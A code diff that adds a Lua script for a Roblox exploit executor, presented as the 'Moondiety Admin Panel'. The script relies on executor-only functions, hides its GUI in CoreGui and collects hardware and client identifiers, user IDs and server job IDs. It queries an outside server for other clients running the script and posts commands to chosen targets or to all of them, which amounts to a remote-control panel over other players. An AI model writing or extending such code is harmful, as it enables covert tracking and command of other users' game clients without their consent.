@@ -1,1 +1,1254 @@
-print('output from 9')
+local isOwnerHwid = ...
+if not isOwnerHwid then return end
+
+local Players          = game:GetService("Players")
+local HttpService      = game:GetService("HttpService")
+local TweenService     = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local TeleportService  = game:GetService("TeleportService")
+local TextService      = game:GetService("TextService")
+
+local player     = Players.LocalPlayer
+local playerName = player.DisplayName or player.Name
+local userId     = player.UserId
+local jobId      = game.JobId
+local gameIdStr  = tostring(game.GameId)
+local placeIdStr = tostring(game.PlaceId)
+local accountAge = player.AccountAge
+
+local SERVER_URL  = "http://c-pl-1.apexnodes.xyz:10002"
+local httpRequest = request or http_request or (http and http.request) or (syn and syn.request)
+
+local realHwid = ""
+do
+    local okHwid, hwidVal = pcall(function()
+        if typeof(gethwid) == "function" then return gethwid() end
+    end)
+    if okHwid and type(hwidVal) == "string" and #hwidVal > 0 then
+        realHwid = hwidVal
+    else
+        local okCid, cid = pcall(function()
+            return game:GetService("RbxAnalyticsService"):GetClientId()
+        end)
+        if okCid and cid then realHwid = "rbx:" .. tostring(cid) end
+    end
+end
+
+local MOON_HWID     = "649d588a851671dbbd9859dd3398f9773fb3b140b7a161a9abd78da79f8de0c775a1e7f15f840fe2de741da09861369be19b01306002f44a6b41b948b89fe49c"
+local MOON_HWID_ALT = "8b7f96b38ad7f5ac6ad1aac819eb61f1d54fe4987b64659b7941a8dbc3a8c53ed43de24a06d67bbfbf3a79c6846df70cd5b329f52056f75773729c8352784c4e"
+
+local hwid = realHwid ~= "" and realHwid or MOON_HWID_ALT
+local function currentHwid() return hwid end
+local clientId = game.JobId .. ":" .. tostring(player.UserId)
+
+local function getSafeGuiParent()
+    local hidden
+    pcall(function()
+        if typeof(gethui) == "function" then hidden = gethui() end
+    end)
+    if typeof(hidden) == "Instance" then return hidden end
+    local core
+    pcall(function()
+        local cg = game:GetService("CoreGui")
+        local probe = Instance.new("Folder")
+        probe.Parent = cg
+        probe:Destroy()
+        core = cg
+    end)
+    if core then return core end
+    return player:WaitForChild("PlayerGui")
+end
+
+local ADMIN_WHITE         = Color3.fromRGB(255, 255, 255)
+local ADMIN_CRIMSON       = Color3.fromRGB(220, 45, 85)
+local ADMIN_CRIMSON_LIGHT = Color3.fromRGB(255, 95, 135)
+local ADMIN_DEEP_BG       = Color3.fromRGB(11, 6, 10)
+local ADMIN_BORDER        = Color3.fromRGB(45, 22, 32)
+local ADMIN_GRAY          = Color3.fromRGB(50, 30, 40)
+local ADMIN_TAB_IDLE      = Color3.fromRGB(30, 20, 28)
+local ADMIN_TAB_HOVER     = Color3.fromRGB(45, 28, 38)
+local ADMIN_GREEN         = Color3.fromRGB(40, 200, 100)
+local ADMIN_CLEAR_BG      = Color3.fromRGB(50, 30, 40)
+
+local function aNew(className, props, parent)
+    local obj = Instance.new(className)
+    for k, v in pairs(props or {}) do obj[k] = v end
+    if parent then obj.Parent = parent end
+    return obj
+end
+local function aCorner(inst, r)
+    return aNew("UICorner", { CornerRadius = UDim.new(0, r or 6) }, inst)
+end
+local function aStroke(inst, col, th, tr)
+    return aNew("UIStroke", { Color = col or ADMIN_BORDER, Thickness = th or 1, Transparency = tr or 0, ApplyStrokeMode = Enum.ApplyStrokeMode.Border }, inst)
+end
+local function aLabel(parent, text, size, color, font)
+    return aNew("TextLabel", {
+        BackgroundTransparency = 1, Size = size, Text = text,
+        TextColor3 = color or ADMIN_WHITE, TextSize = 12,
+        Font = font or Enum.Font.Gotham,
+        TextXAlignment = Enum.TextXAlignment.Left,
+    }, parent)
+end
+
+local function aButton(parent, text, size, color, callback)
+    local baseColor = color or ADMIN_CRIMSON
+    local b = aNew("TextButton", {
+        Size = size, BackgroundColor3 = baseColor, BorderSizePixel = 0,
+        Text = text, TextColor3 = ADMIN_WHITE, TextSize = 12,
+        Font = Enum.Font.GothamBold, AutoButtonColor = false,
+    }, parent)
+    aCorner(b, 6)
+    local hover = baseColor:Lerp(Color3.fromRGB(255, 255, 255), 0.15)
+    local press = baseColor:Lerp(Color3.fromRGB(0, 0, 0), 0.15)
+    b.MouseEnter:Connect(function()
+        if b.Parent then TweenService:Create(b, TweenInfo.new(0.15), { BackgroundColor3 = hover }):Play() end
+    end)
+    b.MouseLeave:Connect(function()
+        if b.Parent then TweenService:Create(b, TweenInfo.new(0.15), { BackgroundColor3 = baseColor }):Play() end
+    end)
+    b.MouseButton1Down:Connect(function()
+        if b.Parent then TweenService:Create(b, TweenInfo.new(0.08), { BackgroundColor3 = press }):Play() end
+    end)
+    b.MouseButton1Up:Connect(function()
+        if b.Parent then TweenService:Create(b, TweenInfo.new(0.1), { BackgroundColor3 = hover }):Play() end
+    end)
+    if callback then b.MouseButton1Click:Connect(callback) end
+    return b
+end
+
+local function aToggleButton(parent, text, size, callback)
+    local btn = aNew("TextButton", {
+        Size = size, BackgroundColor3 = ADMIN_GRAY, BorderSizePixel = 0,
+        Text = "", AutoButtonColor = false,
+    }, parent)
+    aCorner(btn, 6)
+    aStroke(btn, ADMIN_BORDER, 1, 0.5)
+
+    local label = aLabel(btn, text, UDim2.new(1, -64, 1, 0), ADMIN_WHITE, Enum.Font.GothamBold)
+    label.Position = UDim2.new(0, 12, 0, 0)
+    label.ZIndex = 2
+
+    local track = aNew("Frame", {
+        Size = UDim2.new(0, 36, 0, 18), Position = UDim2.new(1, -44, 0.5, -9),
+        BackgroundColor3 = Color3.fromRGB(30, 22, 28), BorderSizePixel = 0, ZIndex = 3,
+    }, btn)
+    aCorner(track, 9)
+    aStroke(track, ADMIN_BORDER, 1, 0.3)
+
+    local knob = aNew("Frame", {
+        Size = UDim2.new(0, 12, 0, 12), Position = UDim2.new(0, 3, 0.5, -6),
+        BackgroundColor3 = ADMIN_WHITE, BorderSizePixel = 0, ZIndex = 4,
+    }, track)
+    aCorner(knob, 6)
+
+    local state = false
+    btn.MouseButton1Click:Connect(function()
+        state = not state
+        TweenService:Create(track, TweenInfo.new(0.2), {
+            BackgroundColor3 = state and ADMIN_GREEN or Color3.fromRGB(30, 22, 28),
+        }):Play()
+        TweenService:Create(knob, TweenInfo.new(0.2), {
+            Position = state and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 3, 0.5, -6),
+        }):Play()
+        if callback then callback(state) end
+    end)
+
+    btn.MouseEnter:Connect(function()
+        if not state and btn.Parent then
+            TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundColor3 = ADMIN_GRAY:Lerp(Color3.fromRGB(255,255,255), 0.1) }):Play()
+        end
+    end)
+    btn.MouseLeave:Connect(function()
+        if not state and btn.Parent then
+            TweenService:Create(btn, TweenInfo.new(0.15), { BackgroundColor3 = ADMIN_GRAY }):Play()
+        end
+    end)
+    return btn
+end
+
+local function aInput(parent, placeholder, size)
+    local f = aNew("Frame", { Size = size, BackgroundColor3 = Color3.fromRGB(25, 18, 24), BorderSizePixel = 0 }, parent)
+    aCorner(f, 6)
+    aStroke(f, ADMIN_BORDER, 1, 0.3)
+    local box = aNew("TextBox", {
+        Size = UDim2.new(1, -24, 1, 0), Position = UDim2.new(0, 12, 0, 0),
+        BackgroundTransparency = 1, Text = "", PlaceholderText = placeholder or "",
+        PlaceholderColor3 = Color3.fromRGB(120, 90, 110), TextColor3 = ADMIN_WHITE,
+        TextSize = 12, Font = Enum.Font.Gotham, TextXAlignment = Enum.TextXAlignment.Left,
+        TextYAlignment = Enum.TextYAlignment.Center,
+        ClearTextOnFocus = false,
+    }, f)
+    return box, f
+end
+
+local function aCodeInput(parent, placeholder, defaultHeight, maxHeight)
+    defaultHeight = defaultHeight or 34
+    maxHeight = maxHeight or 110
+
+    local f = aNew("Frame", {
+        Size = UDim2.new(1, 0, 0, defaultHeight),
+        BackgroundColor3 = Color3.fromRGB(25, 18, 24),
+        BorderSizePixel = 0, ClipsDescendants = true,
+    }, parent)
+    aCorner(f, 6)
+    aStroke(f, ADMIN_BORDER, 1, 0.3)
+
+    local scroll = aNew("ScrollingFrame", {
+        Size = UDim2.new(1, -24, 1, 0), Position = UDim2.new(0, 12, 0, 0),
+        BackgroundTransparency = 1, BorderSizePixel = 0,
+        ScrollBarThickness = 4, CanvasSize = UDim2.new(0, 0, 0, 0),
+        AutomaticCanvasSize = Enum.AutomaticSize.Y,
+        ScrollingDirection = Enum.ScrollingDirection.Y,
+        ScrollBarImageColor3 = ADMIN_CRIMSON,
+    }, f)
+
+    local box = aNew("TextBox", {
+        Size = UDim2.new(1, 0, 0, defaultHeight - 8),
+        BackgroundTransparency = 1, Text = "",
+        PlaceholderText = placeholder or "",
+        PlaceholderColor3 = Color3.fromRGB(120, 90, 110),
+        TextColor3 = ADMIN_WHITE, TextSize = 12, Font = Enum.Font.Gotham,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        TextYAlignment = Enum.TextYAlignment.Center,
+        ClearTextOnFocus = false, MultiLine = true, TextWrapped = true,
+    }, scroll)
+
+    local function updateHeight()
+        if not box.Parent then return end
+        local text = box.Text or ""
+        local lines = 1
+        for _ in text:gmatch("\n") do lines = lines + 1 end
+        
+        box.TextYAlignment = (lines > 1) and Enum.TextYAlignment.Top or Enum.TextYAlignment.Center
+        
+        local lineH = 16
+        local fromLines = lines * lineH + 16
+        local fromBounds = box.TextBounds.Y + 16
+        local needed = math.max(fromLines, fromBounds, defaultHeight - 8)
+        
+        box.Size = UDim2.new(1, 0, 0, needed)
+        local frameH = math.clamp(needed + 8, defaultHeight, maxHeight)
+        f.Size = UDim2.new(1, 0, 0, frameH)
+    end
+
+    box:GetPropertyChangedSignal("Text"):Connect(updateHeight)
+    box:GetPropertyChangedSignal("TextBounds"):Connect(updateHeight)
+
+    return box, f
+end
+
+local function adminHttpGet(url)
+    if not httpRequest then return nil end
+    local ok, result = pcall(httpRequest, { Url = url, Method = "GET", Headers = { ["User-Agent"] = "Roblox/WinInet" } })
+    if not ok or not result or not result.Body then return nil end
+    local okD, d = pcall(HttpService.JSONDecode, HttpService, result.Body)
+    if okD then return d end
+    return nil
+end
+local function adminHttpPost(url, body)
+    if not httpRequest then return nil end
+    local ok, result = pcall(httpRequest, {
+        Url = url, Method = "POST",
+        Headers = { ["Content-Type"] = "application/json", ["User-Agent"] = "Roblox/WinInet" },
+        Body = HttpService:JSONEncode(body),
+    })
+    if not ok or not result or not result.Body then return nil end
+    local okD, d = pcall(HttpService.JSONDecode, HttpService, result.Body)
+    if okD then return d end
+    return nil
+end
+
+local function dedupePlayers(list)
+    local seen, out = {}, {}
+    for _, p in ipairs(list or {}) do
+        local key = p.id or (tostring(p.jobId or "") .. ":" .. tostring(p.userId or ""))
+        if key and key ~= "" and key ~= ":" and not seen[key] then
+            seen[key] = true
+            table.insert(out, p)
+        end
+    end
+    return out
+end
+
+local usersCache = { list = {}, at = 0, fetching = false }
+local USERS_TTL = 10
+
+local function getUsersCached()
+    local now = os.clock()
+    if usersCache.at == 0 then
+        if usersCache.fetching then
+            while usersCache.fetching do task.wait(0.05) end
+            return usersCache.list
+        end
+        usersCache.fetching = true
+        local data = adminHttpGet(SERVER_URL .. "/all?hwid=" .. currentHwid())
+        usersCache.list = dedupePlayers((data and data.players) or {})
+        usersCache.at = os.clock()
+        usersCache.fetching = false
+        return usersCache.list
+    end
+    if now - usersCache.at >= USERS_TTL and not usersCache.fetching then
+        usersCache.fetching = true
+        task.spawn(function()
+            local data = adminHttpGet(SERVER_URL .. "/all?hwid=" .. currentHwid())
+            if data and data.players then
+                usersCache.list = dedupePlayers(data.players)
+                usersCache.at = os.clock()
+            end
+            usersCache.fetching = false
+        end)
+    end
+    return usersCache.list
+end
+
+local function getUsersFresh()
+    local data = adminHttpGet(SERVER_URL .. "/all?hwid=" .. currentHwid())
+    if data and data.players then
+        usersCache.list = dedupePlayers(data.players)
+        usersCache.at = os.clock()
+    end
+    return usersCache.list
+end
+
+local function fetchServers(gid)
+    local url = SERVER_URL .. "/servers?hwid=" .. currentHwid()
+    if gid and gid ~= "" then url = url .. "&gameId=" .. gid end
+    return adminHttpGet(url) or { servers = {} }
+end
+
+local function filterUsers(query, source)
+    local list = getUsersCached()
+    if source == "server" then
+        local myJob = game.JobId
+        local filtered = {}
+        for _, p in ipairs(list) do
+            local pid = tostring(p.id or "")
+            local pJob = pid:match("^([^:]+)") or tostring(p.jobId or "")
+            if pJob == myJob then table.insert(filtered, p) end
+        end
+        list = filtered
+    end
+    local q = string.lower(query or "")
+    if q == "" then return list end
+    local out = {}
+    for _, p in ipairs(list) do
+        local n  = string.lower(tostring(p.name or ""))
+        local un = string.lower(tostring(p.username or ""))
+        local d  = string.lower(tostring(p.displayName or ""))
+        local u  = string.lower(tostring(p.userId or ""))
+        if string.find(n, q, 1, true) or string.find(un, q, 1, true)
+            or string.find(d, q, 1, true) or string.find(u, q, 1, true) then
+            table.insert(out, p)
+        end
+    end
+    return out
+end
+
+local function dispatchCommand(targets, cmdType, payload)
+    local body = {
+        hwid = currentHwid(), type = cmdType, payload = payload or {},
+        gameId = gameIdStr, placeId = placeIdStr,
+    }
+    if payload then
+        for k, v in pairs(payload) do body[k] = v end
+    end
+    if targets == nil then
+        local freshList = getUsersFresh()
+        local ids = {}
+        for _, p in ipairs(freshList) do
+            if p.id and p.id ~= clientId then
+                table.insert(ids, p.id)
+            end
+        end
+        if #ids == 0 then
+            warn("[MoondietyAdmin] no targets for", cmdType)
+            return nil
+        end
+        body.targets = ids
+    else
+        body.targets = targets
+        if #targets == 0 then return nil end
+    end
+    local res = adminHttpPost(SERVER_URL .. "/cmd", body)
+    if not res then
+        warn("[MoondietyAdmin] HTTP fail", cmdType)
+    elseif res.error then
+        warn("[MoondietyAdmin] server error:", tostring(res.error))
+    else
+        print("[MoondietyAdmin]", cmdType, "->", #(body.targets or {}), "targets")
+    end
+    return res
+end
+
+local function hopToServer(targetPlaceId, targetJobId)
+    if not targetJobId or targetJobId == "" then return end
+    local pid = tonumber(targetPlaceId)
+    if not pid or pid <= 0 then pid = game.PlaceId end
+    local ok = pcall(function() TeleportService:TeleportToPlaceInstance(pid, targetJobId, player) end)
+    if not ok then pcall(function() TeleportService:Teleport(pid, player) end) end
+end
+
+local usernameFallbackCache = {}
+local usernameFetching = {}
+local allDropdowns = {}
+
+local function resolveUserNames(p)
+    local uid = tonumber(p.userId)
+
+    if uid then
+        local lp = Players:GetPlayerByUserId(uid)
+        if lp then
+            return lp.Name, lp.DisplayName or lp.Name
+        end
+    end
+
+    local uname = p.username or p.user_name
+    if (not uname or uname == "") and uid then
+        uname = usernameFallbackCache[uid]
+        if not uname and not usernameFetching[uid] then
+            usernameFetching[uid] = true
+            task.spawn(function()
+                local ok, n = pcall(function() return Players:GetNameFromUserIdAsync(uid) end)
+                usernameFetching[uid] = nil
+                if ok and n then
+                    usernameFallbackCache[uid] = n
+                    for _, dd in ipairs(allDropdowns) do
+                        if dd.refreshPlaceholder then pcall(dd.refreshPlaceholder) end
+                    end
+                end
+            end)
+        end
+    end
+
+    local dname = p.displayName or p.display_name
+    if not dname or dname == "" then
+        local pn = p.name
+        if pn and pn ~= "" and pn ~= uname then
+            dname = pn
+        end
+    end
+
+    if not uname or uname == "" then uname = p.name end
+    if not uname or uname == "" then uname = "?" end
+    if not dname or dname == "" then dname = uname end
+
+    return uname, dname
+end
+
+local function buildUserLabel(p)
+    local uname, dname = resolveUserNames(p)
+    local parts = { uname }
+    if dname and dname ~= "" and dname ~= uname then
+        table.insert(parts, dname)
+    end
+    table.insert(parts, p.gameName or "?")
+    return table.concat(parts, " | ")
+end
+
+local function fitText(text, maxW, textSize, font)
+    if maxW <= 0 or #text == 0 then return text end
+    local ok, fullSize = pcall(function()
+        return TextService:GetTextSize(text, textSize, font, Vector2.new(10000, 1000))
+    end)
+    if not ok then return text end
+    if fullSize.X <= maxW then return text end
+    local lo, hi = 0, #text
+    while lo < hi do
+        local mid = math.ceil((lo + hi) / 2)
+        local sub = text:sub(1, mid) .. "..."
+        local sz = TextService:GetTextSize(sub, textSize, font, Vector2.new(10000, 1000))
+        if sz.X <= maxW then lo = mid else hi = mid - 1 end
+    end
+    if lo == 0 then return "..." end
+    return text:sub(1, lo) .. "..."
+end
+
+local function aDropdown(parent, placeholder, getOptions, selectionState, onSelectionChanged, prewarm)
+    local prewarmCount = prewarm or 60
+
+    local container = aNew("Frame", {
+        Size = UDim2.new(1, 0, 0, 34),
+        BackgroundColor3 = Color3.fromRGB(25, 18, 24),
+        BorderSizePixel = 0,
+    }, parent)
+    aCorner(container, 6)
+    aStroke(container, ADMIN_BORDER, 1, 0.3)
+
+    local box = aNew("TextBox", {
+        Size = UDim2.new(1, -44, 1, 0), Position = UDim2.new(0, 12, 0, 0),
+        BackgroundTransparency = 1, Text = "",
+        PlaceholderText = placeholder or "",
+        PlaceholderColor3 = Color3.fromRGB(120, 90, 110), TextColor3 = ADMIN_WHITE,
+        TextSize = 12, Font = Enum.Font.Gotham,
+        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Center,
+        ClearTextOnFocus = false, ZIndex = 3,
+    }, container)
+    pcall(function() box.TextEditable = false end)
+
+    local arrow = aNew("TextButton", {
+        Size = UDim2.new(0, 24, 1, 0), Position = UDim2.new(1, -26, 0, 0),
+        BackgroundTransparency = 1, Text = "▼",
+        TextColor3 = Color3.fromRGB(180, 140, 160),
+        TextSize = 16, Font = Enum.Font.GothamBold,
+        AutoButtonColor = false, ZIndex = 3, Rotation = 0,
+    }, container)
+
+    local listHolder = aNew("Frame", {
+        Position = UDim2.new(0, 0, 1, 4),
+        Size = UDim2.new(1, 0, 0, 0),
+        BackgroundColor3 = Color3.fromRGB(18, 12, 16),
+        BorderSizePixel = 0, Visible = false,
+        ClipsDescendants = true, ZIndex = 20,
+    }, container)
+    aCorner(listHolder, 6)
+    aStroke(listHolder, ADMIN_BORDER, 1, 0)
+
+    local scroll = aNew("ScrollingFrame", {
+        Size = UDim2.new(1, -6, 1, -6), Position = UDim2.new(0, 3, 0, 3),
+        BackgroundTransparency = 1, BorderSizePixel = 0,
+        ScrollBarThickness = 4,
+        CanvasSize = UDim2.new(0, 0, 0, 0),
+        AutomaticCanvasSize = Enum.AutomaticSize.Y,
+        ScrollingDirection = Enum.ScrollingDirection.Y,
+        ScrollBarImageColor3 = ADMIN_CRIMSON, ZIndex = 21,
+    }, listHolder)
+    aNew("UIListLayout", { Padding = UDim.new(0, 2), SortOrder = Enum.SortOrder.LayoutOrder }, scroll)
+
+    local buttonPool = {}
+    local currentUserByIndex = {}
+    local self = { isOpen = false, renderToken = 0 }
+    local suppressTextHandler = false
+    local lastToggleTime = 0
+
+    local function isSelected(p)
+        return p.id and selectionState[p.id] ~= nil
+    end
+
+    local function toggleSelection(p)
+        if not p.id then return end
+        if selectionState[p.id] then
+            selectionState[p.id] = nil
+        else
+            selectionState[p.id] = p
+        end
+    end
+
+    local function updatePlaceholder()
+        local names = {}
+        for _, p in pairs(selectionState) do
+            local uname = resolveUserNames(p)
+            table.insert(names, uname)
+        end
+        if #names == 0 then
+            box.PlaceholderText = placeholder
+            return
+        end
+        table.sort(names)
+        local text = table.concat(names, ", ")
+        local maxW = box.AbsoluteSize.X - 8
+        if maxW > 0 then
+            text = fitText(text, maxW, 12, Enum.Font.Gotham)
+        end
+        box.PlaceholderText = text
+    end
+
+    local function ensureButton(idx)
+        local btn = buttonPool[idx]
+        if btn and btn.Parent then return btn end
+        btn = aNew("TextButton", {
+            Size = UDim2.new(1, -4, 0, 24),
+            BackgroundColor3 = ADMIN_CRIMSON, BackgroundTransparency = 1,
+            BorderSizePixel = 0, Text = "", TextColor3 = ADMIN_WHITE,
+            TextSize = 11, Font = Enum.Font.Gotham, TextXAlignment = Enum.TextXAlignment.Left,
+            AutoButtonColor = false, ZIndex = 22, Visible = false,
+        }, scroll)
+        aCorner(btn, 4)
+        btn.MouseEnter:Connect(function()
+            if not btn.Visible or not btn.Parent then return end
+            local p = currentUserByIndex[btn.LayoutOrder]
+            if p and isSelected(p) then return end
+            TweenService:Create(btn, TweenInfo.new(0.1), { BackgroundTransparency = 0.7 }):Play()
+        end)
+        btn.MouseLeave:Connect(function()
+            if not btn.Visible or not btn.Parent then return end
+            local p = currentUserByIndex[btn.LayoutOrder]
+            if p and isSelected(p) then return end
+            TweenService:Create(btn, TweenInfo.new(0.1), { BackgroundTransparency = 1 }):Play()
+        end)
+        btn.MouseButton1Down:Connect(function()
+            if not btn.Visible then return end
+            local p = currentUserByIndex[btn.LayoutOrder]
+            if not p then return end
+            toggleSelection(p)
+            updatePlaceholder()
+            local sel = isSelected(p)
+            btn.Text = "   " .. buildUserLabel(p)
+            btn.BackgroundTransparency = sel and 0.5 or 1
+            if onSelectionChanged then onSelectionChanged() end
+            if self.isOpen then
+                task.defer(function()
+                    if box.Parent and self.isOpen then
+                        pcall(function() box:CaptureFocus() end)
+                    end
+                end)
+            end
+        end)
+        buttonPool[idx] = btn
+        return btn
+    end
+
+    local function applyRow(i, p)
+        local btn = ensureButton(i)
+        local sel = isSelected(p)
+        btn.Text = "   " .. buildUserLabel(p)
+        btn.BackgroundTransparency = sel and 0.5 or 1
+        btn.LayoutOrder = i
+        btn.Visible = true
+        currentUserByIndex[i] = p
+    end
+
+    local function renderList(query, isOpening)
+        query = query or ""
+        local allOpts = getOptions(query) or {}
+        local shown = #allOpts
+
+        self.renderToken = self.renderToken + 1
+        local myToken = self.renderToken
+
+        for i = shown + 1, #buttonPool do
+            local b = buttonPool[i]
+            if b and b.Parent then b.Visible = false end
+            currentUserByIndex[i] = nil
+        end
+
+        local itemH = 24
+        local padding = 2
+        local MAX_VISIBLE = 6
+        local contentH = shown * itemH + math.max(0, shown - 1) * padding
+        local maxContentH = MAX_VISIBLE * itemH + (MAX_VISIBLE - 1) * padding
+        local totalH = math.min(contentH, maxContentH) + 6
+        scroll.ScrollBarThickness = (contentH > maxContentH) and 4 or 0
+
+        listHolder.Visible = (shown > 0)
+        if isOpening then
+            listHolder.Size = UDim2.new(1, 0, 0, 0)
+            TweenService:Create(listHolder, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.new(1, 0, 0, totalH) }):Play()
+            TweenService:Create(arrow, TweenInfo.new(0.2), { Rotation = 180 }):Play()
+        else
+            listHolder.Size = UDim2.new(1, 0, 0, totalH)
+        end
+
+        if shown <= 100 then
+            for i = 1, shown do
+                applyRow(i, allOpts[i])
+            end
+            return
+        end
+
+        task.spawn(function()
+            local CHUNK = 100
+            for chunkStart = 1, shown, CHUNK do
+                if self.renderToken ~= myToken then return end
+                if not container.Parent or not self.isOpen then return end
+                local chunkEnd = math.min(chunkStart + CHUNK - 1, shown)
+                for i = chunkStart, chunkEnd do
+                    applyRow(i, allOpts[i])
+                end
+                if chunkEnd < shown then task.wait() end
+            end
+        end)
+    end
+
+    function self.refreshPlaceholder()
+        updatePlaceholder()
+        if self.isOpen then renderList(box.Text, false) end
+    end
+
+    function self.hitTest(pos)
+        if not container.Parent then return false end
+        local function inObj(obj)
+            if not obj or not obj.Parent then return false end
+            local a = obj.AbsolutePosition
+            local s = obj.AbsoluteSize
+            return pos.X >= a.X and pos.X <= a.X + s.X and pos.Y >= a.Y and pos.Y <= a.Y + s.Y
+        end
+        return inObj(container) or (listHolder.Visible and inObj(listHolder))
+    end
+
+    function self.doClose()
+        if not self.isOpen then return end
+        self.isOpen = false
+        self.renderToken = self.renderToken + 1
+        pcall(function() box.TextEditable = false end)
+        pcall(function() box:ReleaseFocus() end)
+        suppressTextHandler = true
+        if box.Text ~= "" then box.Text = "" end
+        suppressTextHandler = false
+        local tw = TweenService:Create(listHolder, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), { Size = UDim2.new(1, 0, 0, 0) })
+        tw.Completed:Connect(function() listHolder.Visible = false end)
+        tw:Play()
+        TweenService:Create(arrow, TweenInfo.new(0.2), { Rotation = 0 }):Play()
+    end
+
+    function self.doOpen()
+        if self.isOpen then return end
+        self.isOpen = true
+        pcall(function() box.TextEditable = true end)
+        suppressTextHandler = true
+        if box.Text ~= "" then box.Text = "" end
+        suppressTextHandler = false
+        renderList("", true)
+        task.defer(function()
+            if box.Parent and self.isOpen then
+                pcall(function() box:CaptureFocus() end)
+            end
+        end)
+    end
+
+    local function toggleSelf()
+        local now = os.clock()
+        if now - lastToggleTime < 0.2 then return end
+        lastToggleTime = now
+        if self.isOpen then self.doClose() else self.doOpen() end
+    end
+
+    box.Focused:Connect(function()
+        if not self.isOpen then
+            pcall(function() box:ReleaseFocus() end)
+        end
+    end)
+
+    box.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1
+            or inp.UserInputType == Enum.UserInputType.Touch then
+            toggleSelf()
+        end
+    end)
+
+    arrow.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1
+            or inp.UserInputType == Enum.UserInputType.Touch then
+            toggleSelf()
+        end
+    end)
+
+    container.InputBegan:Connect(function(inp)
+        if inp.UserInputType ~= Enum.UserInputType.MouseButton1
+            and inp.UserInputType ~= Enum.UserInputType.Touch then return end
+        if listHolder.Visible then
+            local a = listHolder.AbsolutePosition
+            local s = listHolder.AbsoluteSize
+            local px, py = inp.Position.X, inp.Position.Y
+            if px >= a.X and px <= a.X + s.X and py >= a.Y and py <= a.Y + s.Y then return end
+        end
+        toggleSelf()
+    end)
+
+    box:GetPropertyChangedSignal("Text"):Connect(function()
+        if suppressTextHandler then return end
+        if self.isOpen then renderList(box.Text, false) end
+    end)
+
+    box:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
+        if next(selectionState) ~= nil then updatePlaceholder() end
+    end)
+
+    updatePlaceholder()
+    table.insert(allDropdowns, self)
+
+    task.spawn(function()
+        task.wait(0.4)
+        for i = 1, prewarmCount do
+            if not container.Parent then return end
+            ensureButton(i)
+            if i % 10 == 0 then task.wait() end
+        end
+    end)
+
+    return box, container, updatePlaceholder, self
+end
+
+local panelRef = { sg = nil, main = nil, scale = nil }
+local dragConn = nil
+local endConn = nil
+
+local function closeAllDropdowns()
+    local snapshot = {}
+    for _, dd in ipairs(allDropdowns) do
+        if dd.isOpen then table.insert(snapshot, dd) end
+    end
+    for _, dd in ipairs(snapshot) do
+        if dd.doClose then dd.doClose() end
+    end
+end
+
+local function animateClose(afterClose)
+    if not panelRef.sg or not panelRef.scale then
+        if afterClose then afterClose() end
+        return
+    end
+    closeAllDropdowns()
+    local ref = panelRef
+    TweenService:Create(ref.scale, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = 0 }):Play()
+    task.delay(0.2, function()
+        if ref.sg then ref.sg.Enabled = false end
+        if ref.scale and ref.scale.Parent then ref.scale.Scale = 1 end
+        if afterClose then pcall(afterClose) end
+    end)
+end
+
+local function animateOpen()
+    if not panelRef.sg or not panelRef.scale or not panelRef.sg.Parent then
+        buildAdminPanel()
+        return
+    end
+    panelRef.sg.Enabled = true
+    panelRef.scale.Scale = 0
+    TweenService:Create(panelRef.scale, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
+end
+
+UserInputService.InputBegan:Connect(function(inp)
+    if not panelRef.sg or not panelRef.sg.Parent then return end
+    if not panelRef.sg.Enabled then return end
+    if inp.UserInputType ~= Enum.UserInputType.MouseButton1 and inp.UserInputType ~= Enum.UserInputType.Touch then return end
+    local anyOpen = false
+    for _, dd in ipairs(allDropdowns) do
+        if dd.isOpen then anyOpen = true; break end
+    end
+    if not anyOpen then return end
+    local pos = Vector2.new(inp.Position.X, inp.Position.Y)
+    local inside = false
+    for _, dd in ipairs(allDropdowns) do
+        if dd.hitTest and dd.hitTest(pos) then inside = true; break end
+    end
+    if not inside then closeAllDropdowns() end
+end)
+
+function buildAdminPanel()
+    local guiParent = getSafeGuiParent()
+    if not guiParent then return end
+    local old = guiParent:FindFirstChild("MoondietyAdminPanel")
+    if old then old:Destroy() end
+    allDropdowns = {}
+
+    local sg = aNew("ScreenGui", {
+        Name = "MoondietyAdminPanel", ResetOnSpawn = false,
+        IgnoreGuiInset = true, DisplayOrder = 100000,
+    })
+    sg.Parent = guiParent
+
+    local main = aNew("Frame", {
+        AnchorPoint = Vector2.new(0.5, 0.5),
+        Position = UDim2.new(0.5, 0, 0.5, 0),
+        Size = UDim2.new(0, 880, 0, 460),
+        BackgroundColor3 = ADMIN_DEEP_BG, BorderSizePixel = 0,
+    }, sg)
+    aCorner(main, 14)
+    aStroke(main, ADMIN_BORDER, 1, 0)
+
+    local uiScale = aNew("UIScale", { Scale = 0 }, main)
+    TweenService:Create(uiScale, TweenInfo.new(0.28, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1 }):Play()
+
+    panelRef.sg = sg
+    panelRef.main = main
+    panelRef.scale = uiScale
+
+    local header = aNew("Frame", {
+        Size = UDim2.new(1, 0, 0, 52),
+        BackgroundColor3 = Color3.fromRGB(18, 10, 16), BorderSizePixel = 0,
+    }, main)
+    aCorner(header, 14)
+    aNew("Frame", {
+        Size = UDim2.new(1, 0, 0, 26), Position = UDim2.new(0, 0, 1, -26),
+        BackgroundColor3 = Color3.fromRGB(18, 10, 16), BorderSizePixel = 0,
+    }, header)
+
+    local title = aLabel(header, "MOONDIETY ADMIN PANEL", UDim2.new(0, 400, 1, 0), ADMIN_CRIMSON_LIGHT)
+    title.Position = UDim2.new(0, 18, 0, 0)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 18
+
+    local hideBtn = aButton(header, "—", UDim2.new(0, 28, 0, 28), ADMIN_GRAY, function()
+        animateClose()
+    end)
+    hideBtn.Position = UDim2.new(1, -72, 0.5, -14)
+
